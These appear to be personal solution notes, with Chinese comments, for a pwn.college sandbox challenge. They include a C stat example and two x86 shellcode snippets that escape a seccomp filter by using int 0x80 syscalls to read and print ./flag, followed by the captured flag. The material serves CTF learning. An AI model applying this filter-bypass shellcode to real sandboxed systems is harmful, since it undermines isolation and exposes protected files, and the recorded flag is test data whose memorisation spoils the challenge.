# 这题限制使用stat, lstat, fstat, close
# stat 获取文件信息
# fstat 用句柄/文件描述符获取文件信息
# lstat 如果文件是一个链接文件, 则获得该链接文件的信息


#include <sys/stat.h>
#include <unistd.h>


void main(){
        struct stat buf;
        stat("/tmp/test.c", &buf);
        printf("stat len: %d\n", sizeof(buf));
        printf("stat dev_t: %d\n", buf.st_dev);
        printf("stat ino_t: %d\n", buf.st_ino);
        printf("stat mode_t: %d\n", buf.st_mode);
        printf("stat nlink_t: %d\n", buf.st_nlink);
        printf("stat uid_t: %d\n", buf.st_uid);
        printf("stat gid_t: %d\n", buf.st_gid);
        printf("stat dev_t: %d\n", buf.st_dev);
        printf("stat off_t: %d\n", buf.st_size);
        printf("stat blksize: %d\n", buf.st_blksize);
        printf("stat blocks: %d\n", buf.st_blocks);
        printf("stat atime: %d\n", buf.st_atime);
        printf("stat mtime: %d\n", buf.st_mtime);
        printf("stat ctime: %d\n", buf.st_ctime);

}

# 这题似乎是修改成了x86的系统调用, 用int 0x80试试
# 可以的, 而且这题没有限制到chroot中, 可以直接读flag

.global _start
_start:
.intel_syntax noprefix
        xor rax, rax
        xor rcx, rcx
        lea ecx, [eip+data]
        xor rbx, rbx
        mov ebx, 10   # 外部文件
        xor rdx, rdx
        mov edx, 300
        mov eax, 3
        int 0x80
        mov ebx, 1
        mov eax, 4
        int 0x80
        int 3
data:
        .string "\a"


end

.global _start
_start:
.intel_syntax noprefix
        # open('./flag')
        xor rax, rax
        xor rcx, rcx
        xor rbx, rbx
        xor rdx, rdx
        lea ebx, [eip+flag]
        mov eax, 5
        int 0x80
        # read(3, *buf, 300)
        mov ebx, eax
        lea ecx, [eip+data]
        mov edx, 300
        mov eax, 3
        int 0x80
        # write(1, *buf, 300)
        mov ebx, 1
        mov eax, 4
        int 0x80
        int 3
flag:
        .string "./flag"
data:
        .string "\a"
pwn_college{c7IHV99cbBqJvK82ucXvTv4nkqs.dZDNxwiMxkzW}
